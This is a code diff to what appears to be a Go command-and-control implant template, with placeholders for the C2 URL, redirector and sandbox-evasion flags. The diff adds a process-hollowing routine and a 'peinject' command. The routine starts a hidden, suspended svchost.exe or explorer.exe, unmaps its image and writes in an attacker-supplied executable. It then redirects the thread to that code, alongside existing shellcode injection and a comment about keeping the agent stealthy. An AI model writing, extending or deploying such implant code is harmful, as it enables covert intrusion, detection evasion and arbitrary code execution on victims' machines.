@@ -29,21 +29,32 @@ const (
 	PROCESS_VM_OPERATION = 0x0008
 	PROCESS_VM_WRITE = 0x0020
 	PROCESS_VM_READ = 0x0010
+	PROCESS_SUSPEND_RESUME = 0x0800
 	MEM_COMMIT = 0x1000
 	MEM_RESERVE = 0x2000
 	PAGE_EXECUTE_READWRITE = 0x40
 	PAGE_READWRITE = 0x04
 
 	// For kernel32.dll functions
-	PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ
+	PROCESS_ALL_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_SUSPEND_RESUME
 
 	// For process enumeration
 	TH32CS_SNAPPROCESS = 0x00000002
 	MAX_PATH = 260
+
+	// For process hollowing
+	IMAGE_DOS_SIGNATURE = 0x5A4D
+	IMAGE_NT_SIGNATURE = 0x00004550
+	IMAGE_FILE_MACHINE_I386 = 0x014c
+	IMAGE_FILE_MACHINE_AMD64 = 0x8664
+	IMAGE_FILE_RELOCS_STRIPPED = 0x0001
+	IMAGE_FILE_EXECUTABLE_IMAGE = 0x0002
+	IMAGE_FILE_MACHINE_UNKNOWN = 0
 )
 
 var (
 	kernel32 = syscall.NewLazyDLL("kernel32.dll")
+	ntdll = syscall.NewLazyDLL("ntdll.dll")
 	procOpenProcess = kernel32.NewProc("OpenProcess")
 	procVirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
 	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
@@ -52,6 +63,13 @@ var (
 	procCreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
 	procProcess32First = kernel32.NewProc("Process32FirstW")
 	procProcess32Next = kernel32.NewProc("Process32NextW")
+	procCreateProcess = kernel32.NewProc("CreateProcessW")
+	procResumeThread = kernel32.NewProc("ResumeThread")
+	procSuspendThread = kernel32.NewProc("SuspendThread")
+	procGetThreadContext = kernel32.NewProc("GetThreadContext")
+	procSetThreadContext = kernel32.NewProc("SetThreadContext")
+	procReadProcessMemory = kernel32.NewProc("ReadProcessMemory")
+	procNtUnmapViewOfSection = ntdll.NewProc("NtUnmapViewOfSection")
 )
 
 // PROCESSENTRY32 structure for process enumeration
@@ -66,6 +84,176 @@ type PROCESSENTRY32 struct {
 	PriClassBase    int32
 	Flags           uint32
 	ExeFile         [MAX_PATH]uint16
+}
+
+// Windows structures for PE parsing and process hollowing
+type IMAGE_DOS_HEADER struct {
+	E_magic    uint16
+	E_cblp     uint16
+	E_cp       uint16
+	E_crlc     uint16
+	E_cparhdr  uint16
+	E_minalloc uint16
+	E_maxalloc uint16
+	E_ss       uint16
+	E_sp       uint16
+	E_csum     uint16
+	E_ip       uint16
+	E_cs       uint16
+	E_lfarlc   uint16
+	E_ovno     uint16
+	E_res      [4]uint16
+	E_oemid    uint16
+	E_oeminfo  uint16
+	E_res2     [10]uint16
+	E_lfanew   int32
+}
+
+type IMAGE_FILE_HEADER struct {
+	Machine              uint16
+	NumberOfSections     uint16
+	TimeDateStamp        uint32
+	PointerToSymbolTable uint32
+	NumberOfSymbols      uint32
+	SizeOfOptionalHeader uint16
+	Characteristics      uint16
+}
+
+type IMAGE_DATA_DIRECTORY struct {
+	VirtualAddress uint32
+	Size           uint32
+}
+
+type IMAGE_OPTIONAL_HEADER32 struct {
+	Magic                   uint16
+	MajorLinkerVersion      uint8
+	MinorLinkerVersion      uint8
+	SizeOfCode              uint32
+	SizeOfInitializedData   uint32
+	SizeOfUninitializedData uint32
+	AddressOfEntryPoint     uint32
+	BaseOfCode              uint32
+	BaseOfData              uint32
+	ImageBase               uint32
+	SectionAlignment      uint32
+	FileAlignment         uint32
+	MajorOperatingSystemVersion uint16
+	MinorOperatingSystemVersion uint16
+	MajorImageVersion     uint16
+	MinorImageVersion     uint16
+	MajorSubsystemVersion uint16
+	MinorSubsystemVersion uint16
+	Win32VersionValue     uint32
+	SizeOfImage           uint32
+	SizeOfHeaders         uint32
+	CheckSum              uint32
+	Subsystem             uint16
+	DllCharacteristics    uint16
+	SizeOfStackReserve    uint32
+	SizeOfStackCommit     uint32
+	SizeOfHeapReserve     uint32
+	SizeOfHeapCommit      uint32
+	LoaderFlags           uint32
+	NumberOfRvaAndSizes   uint32
+	DataDirectory         [16]IMAGE_DATA_DIRECTORY
+}
+
+type IMAGE_OPTIONAL_HEADER64 struct {
+	Magic                   uint16
+	MajorLinkerVersion      uint8
+	MinorLinkerVersion      uint8
+	SizeOfCode              uint32
+	SizeOfInitializedData   uint32
+	SizeOfUninitializedData uint32
+	AddressOfEntryPoint     uint32
+	BaseOfCode              uint32
+	ImageBase               uint64
+	SectionAlignment      uint32
+	FileAlignment         uint32
+	MajorOperatingSystemVersion uint16
+	MinorOperatingSystemVersion uint16
+	MajorImageVersion     uint16
+	MinorImageVersion     uint16
+	MajorSubsystemVersion uint16
+	MinorSubsystemVersion uint16
+	Win32VersionValue     uint32
+	SizeOfImage           uint32
+	SizeOfHeaders         uint32
+	CheckSum              uint32
+	Subsystem             uint16
+	DllCharacteristics    uint16
+	SizeOfStackReserve    uint64
+	SizeOfStackCommit     uint64
+	SizeOfHeapReserve     uint64
+	SizeOfHeapCommit      uint64
+	LoaderFlags           uint32
+	NumberOfRvaAndSizes   uint32
+	DataDirectory         [16]IMAGE_DATA_DIRECTORY
+}
+
+type IMAGE_NT_HEADERS32 struct {
+	Signature      uint32
+	FileHeader     IMAGE_FILE_HEADER
+	OptionalHeader IMAGE_OPTIONAL_HEADER32
+}
+
+type IMAGE_NT_HEADERS64 struct {
+	Signature      uint32
+	FileHeader     IMAGE_FILE_HEADER
+	OptionalHeader IMAGE_OPTIONAL_HEADER64
+}
+
+type IMAGE_SECTION_HEADER struct {
+	Name            [8]uint8
+	VirtualSize     uint32
+	VirtualAddress  uint32
+	SizeOfRawData   uint32
+	PointerToRawData uint32
+	PointerToRelocations uint32
+	PointerToLinenumbers uint32
+	NumberOfRelocations uint16
+	NumberOfLinenumbers uint16
+	Characteristics uint32
+}
+
+type PROCESS_INFORMATION struct {
+	Process   uintptr
+	Thread    uintptr
+	ProcessId uint32
+	ThreadId  uint32
+}
+
+type STARTUPINFO struct {
+	Cb            uint32
+	_             *uint16
+	Desktop       *uint16
+	Title         *uint16
+	X             uint32
+	Y             uint32
+	XSize         uint32
+	YSize         uint32
+	XCountChars   uint32
+	YCountChars   uint32
+	FillAttribute uint32
+	Flags         uint32
+	ShowWindow    uint16
+	_             uint16
+	_             *byte
+	StdInput      uintptr
+	StdOutput     uintptr
+	StdError      uintptr
+}
+
+type CONTEXT struct {
+	ContextFlags uint32
+	/* Additional fields depending on architecture */
+	/* For x64 */
+	Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi, R8, R9, R10, R11, R12, R13, R14, R15 uint64
+	Rip uint64
+	/* Control flags */
+	EFlags uint32
+	/* Segment values */
+	Cs, Ss, Ds, Es, Fs, Gs uint16
 }
 
 func createToolhelp32Snapshot(flags uint32, processID uint32) uintptr {
@@ -90,6 +278,86 @@ func process32Next(snapshot uintptr, pe *PROCESSENTRY32) bool {
 		uintptr(unsafe.Pointer(pe)),
 	)
 	return ret != 0
+}
+
+func createProcess(applicationName *uint16, commandLine *uint16, processAttributes, threadAttributes *syscall.SecurityAttributes, inheritHandles bool, creationFlags uint32, environment uintptr, currentDirectory *uint16, startupInfo *STARTUPINFO, processInformation *PROCESS_INFORMATION) error {
+	var inheritHandlesInt int32 = 0
+	if inheritHandles {
+		inheritHandlesInt = 1
+	}
+	ret, _, callErr := procCreateProcess.Call(
+		uintptr(unsafe.Pointer(applicationName)),
+		uintptr(unsafe.Pointer(commandLine)),
+		uintptr(unsafe.Pointer(processAttributes)),
+		uintptr(unsafe.Pointer(threadAttributes)),
+		uintptr(inheritHandlesInt),
+		uintptr(creationFlags),
+		environment,
+		uintptr(unsafe.Pointer(currentDirectory)),
+		uintptr(unsafe.Pointer(startupInfo)),
+		uintptr(unsafe.Pointer(processInformation)),
+	)
+	if ret == 0 {
+		return callErr
+	}
+	return nil
+}
+
+func resumeThread(threadHandle uintptr) (uint32, error) {
+	ret, _, callErr := procResumeThread.Call(threadHandle)
+	if ret == 0xFFFFFFFF {
+		return 0, callErr
+	}
+	return uint32(ret), nil
+}
+
+func suspendThread(threadHandle uintptr) (uint32, error) {
+	ret, _, callErr := procSuspendThread.Call(threadHandle)
+	if ret == 0xFFFFFFFF {
+		return 0, callErr
+	}
+	return uint32(ret), nil
+}
+
+func getThreadContext(threadHandle uintptr, context *CONTEXT) error {
+	ret, _, callErr := procGetThreadContext.Call(
+		threadHandle,
+		uintptr(unsafe.Pointer(context)),
+	)
+	if ret == 0 {
+		return callErr
+	}
+	return nil
+}
+
+func setThreadContext(threadHandle uintptr, context *CONTEXT) error {
+	ret, _, callErr := procSetThreadContext.Call(
+		threadHandle,
+		uintptr(unsafe.Pointer(context)),
+	)
+	if ret == 0 {
+		return callErr
+	}
+	return nil
+}
+
+func readProcessMemory(process uintptr, baseAddress uintptr, buffer uintptr, size uintptr, numberOfBytesRead *uintptr) bool {
+	ret, _, _ := procReadProcessMemory.Call(
+		process,
+		baseAddress,
+		buffer,
+		size,
+		uintptr(unsafe.Pointer(numberOfBytesRead)),
+	)
+	return ret != 0
+}
+
+func ntUnmapViewOfSection(processHandle uintptr, baseAddress uintptr) uint32 {
+	ret, _, _ := procNtUnmapViewOfSection.Call(
+		processHandle,
+		baseAddress,
+	)
+	return uint32(ret)
 }
 
 func openProcess(desiredAccess uint32, inheritHandle int32, processId uint32) uintptr {
@@ -860,6 +1128,166 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) st
 	return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d), thread ID: %d", targetProcess, pid, threadID)
 }
 
+func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {
+	if runtime.GOOS != "windows" {
+		return "[ERROR] PE injection only supported on Windows"
+	}
+
+	if len(peData) < 1024 { // Minimum size check
+		return "[ERROR] PE file too small to be valid"
+	}
+
+	// Parse the PE file to extract necessary information
+	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&peData[0]))
+	if dosHeader.E_magic != IMAGE_DOS_SIGNATURE {
+		return "[ERROR] Invalid DOS signature"
+	}
+
+	ntHeadersOffset := dosHeader.E_lfanew
+	if int(ntHeadersOffset) >= len(peData) || ntHeadersOffset < 0 {
+		return "[ERROR] Invalid NT headers offset"
+	}
+
+	// Add bounds checking for NT signature
+	if int(ntHeadersOffset) + 4 > len(peData) {
+		return "[ERROR] NT headers offset beyond data bounds"
+	}
+
+	ntSignature := *(*uint32)(unsafe.Pointer(&peData[ntHeadersOffset]))
+	if ntSignature != IMAGE_NT_SIGNATURE {
+		return "[ERROR] Invalid NT signature"
+	}
+
+	// Parse NT headers based on architecture
+	if int(ntHeadersOffset) + 4 + int(unsafe.Sizeof(IMAGE_FILE_HEADER{})) >= len(peData) {
+		return "[ERROR] PE data too small for NT headers"
+	}
+
+	fileHeader := (*IMAGE_FILE_HEADER)(unsafe.Pointer(&peData[ntHeadersOffset+4]))
+
+	var imageBase uint64
+	var entryPoint uint32
+	var imageSize uint32
+
+	if fileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 {
+		headerOffset := ntHeadersOffset + int32(4) + int32(unsafe.Sizeof(IMAGE_FILE_HEADER{}))
+		if int(headerOffset) + int(unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{})) >= len(peData) {
+			return "[ERROR] PE data too small for x64 optional header"
+		}
+		optionalHeader := (*IMAGE_OPTIONAL_HEADER64)(unsafe.Pointer(&peData[headerOffset]))
+		imageBase = optionalHeader.ImageBase
+		entryPoint = optionalHeader.AddressOfEntryPoint
+		imageSize = optionalHeader.SizeOfImage
+	} else if fileHeader.Machine == IMAGE_FILE_MACHINE_I386 {
+		headerOffset := ntHeadersOffset + int32(4) + int32(unsafe.Sizeof(IMAGE_FILE_HEADER{}))
+		if int(headerOffset) + int(unsafe.Sizeof(IMAGE_OPTIONAL_HEADER32{})) >= len(peData) {
+			return "[ERROR] PE data too small for x86 optional header"
+		}
+		optionalHeader := (*IMAGE_OPTIONAL_HEADER32)(unsafe.Pointer(&peData[headerOffset]))
+		imageBase = uint64(optionalHeader.ImageBase)
+		entryPoint = optionalHeader.AddressOfEntryPoint
+		imageSize = optionalHeader.SizeOfImage
+	} else {
+		return "[ERROR] Unsupported architecture"
+	}
+
+	// Create target process in suspended state
+	targetPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\svchost.exe")
+	var si STARTUPINFO
+	var pi PROCESS_INFORMATION
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.Flags = 0x1        // STARTF_USESHOWWINDOW
+	si.ShowWindow = 0     // SW_HIDE (hidden)
+
+	// Command line needed for svchost.exe to work properly
+	cmdLine, _ := syscall.UTF16PtrFromString("svchost.exe -k netsvcs -s BITS")
+
+	err := createProcess(
+		targetPath, // Path to target process
+		cmdLine,    // Command line (needed for svchost.exe)
+		nil,        // Process attributes
+		nil,        // Thread attributes
+		false,      // Inherit handles
+		0x4,        // CREATE_SUSPENDED flag
+		0,          // Environment
+		nil,        // Current directory
+		&si,        // Startup info
+		&pi,        // Process information
+	)
+
+	// If svchost.exe fails, fallback to explorer.exe
+	if err != nil {
+		targetPath, _ = syscall.UTF16PtrFromString("C:\\Windows\\explorer.exe")
+		cmdLine, _ = syscall.UTF16PtrFromString("explorer.exe")
+		err = createProcess(
+			targetPath,
+			cmdLine,
+			nil,
+			nil,
+			false,
+			0x4,
+			0,
+			nil,
+			&si,
+			&pi,
+		)
+
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Failed to create suspended target process (svchost.exe or explorer.exe): %v", err)
+		}
+	}
+
+	// Unmap the target process memory
+	result := ntUnmapViewOfSection(pi.Process, uintptr(imageBase))
+	if result != 0 {
+		// Continue execution anyway as this might not be critical
+	}
+
+	// Allocate memory in the target process for the PE file
+	allocAddr := virtualAllocEx(pi.Process, uintptr(imageBase), uintptr(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+	if allocAddr == 0 {
+		// Try without specifying base address
+		allocAddr = virtualAllocEx(pi.Process, 0, uintptr(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
+		if allocAddr == 0 {
+			return "[ERROR] Failed to allocate memory in target process"
+		}
+	} else {
+	}
+
+	// Write the PE headers to the allocated memory
+	var bytesWritten uintptr
+	success := writeProcessMemory(pi.Process, allocAddr, uintptr(unsafe.Pointer(&peData[0])), uintptr(len(peData)), &bytesWritten)
+	if !success {
+		return "[ERROR] Failed to write PE headers to target process memory"
+	}
+
+	// Get the current thread context
+	var context CONTEXT
+	context.ContextFlags = 0x00000001 | 0x00000002 | 0x00000010 // CONTEXT_CONTROL | CONTEXT_INTEGER
+	err = getThreadContext(pi.Thread, &context)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to get thread context: %v", err)
+	}
+
+	// Update the entry point in the context
+	newEntryPoint := allocAddr + uintptr(entryPoint)
+	context.Rip = uint64(newEntryPoint) // For x64, update the instruction pointer
+
+	// Set the updated context
+	err = setThreadContext(pi.Thread, &context)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to set thread context: %v", err)
+	}
+
+	// Resume the target process thread
+	_, err = resumeThread(pi.Thread)
+	if err != nil {
+		return fmt.Sprintf("[ERROR] Failed to resume target process thread: %v", err)
+	}
+
+	return fmt.Sprintf("[SUCCESS] PE file injected and executed in process PID: %d, TID: %d", pi.ProcessId, pi.ThreadId)
+}
+
 func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {
 
 	if strings.HasPrefix(command, "module ") {
@@ -889,6 +1317,19 @@ func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) strin
 			return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
 		}
 		result := a.{AGENT_INJECT_SHELLCODE_FUNC}(shellcodeData)
+		return result
+	} else if strings.HasPrefix(command, "peinject ") {
+		// Handle PE injection command - check for 'pe' prefix
+		encodedPE := command[9:] // Remove "peinject " prefix
+		if len(encodedPE) < 2 || !strings.HasPrefix(encodedPE, "pe") {
+			return "[ERROR] PE injection command must start with 'pe' prefix"
+		}
+		encodedData := encodedPE[2:] // Remove "pe" prefix
+		peData, err := base64.StdEncoding.DecodeString(encodedData)
+		if err != nil {
+			return fmt.Sprintf("[ERROR] Invalid PE data format: %v", err)
+		}
+		result := a.{AGENT_INJECT_PE_FUNC}(peData)
 		return result
 	} else if command == "kill" {
 		a.{AGENT_RUNNING_FIELD} = false
@@ -1437,10 +1878,8 @@ func main() {
 	c2URL := "{C2_URL}"
 	redirectorHost := "{REDIRECTOR_HOST}"
 	redirectorPort := {REDIRECTOR_PORT}
-	useRedirector := {USE_REDIRECTOR} // Will be true or false based on generation flag
-	disableSandbox := {DISABLE_SANDBOX} // Will be true or false based on generation flag
-
-	// Removed debug prints to keep agent stealthy
+	useRedirector := {USE_REDIRECTOR}
+	disableSandbox := {DISABLE_SANDBOX}
 
 	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost, redirectorPort, useRedirector, disableSandbox)
 	if err != nil {
